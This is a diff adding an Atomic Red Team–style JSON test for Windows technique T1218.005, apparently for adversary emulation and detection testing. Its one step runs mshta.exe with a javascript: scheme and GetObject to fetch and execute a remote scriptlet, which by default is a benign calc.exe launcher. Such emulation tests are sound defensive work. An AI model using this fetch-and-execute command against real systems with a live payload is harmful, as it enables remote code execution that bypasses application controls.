@@ -1,0 +1,31 @@
+{
+  "id": "1483fab9-4f52-4217-a9ce-daa9d7747cae",
+  "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
+  "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bfda744f-88e0-480f-ac1f-d218ddfc012a",
+      "type": "execute-command",
+      "data": {
+        "command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1218.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_url",
+      "type": "url",
+      "description": "location of the payload",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct"
+    }
+  ]
+}
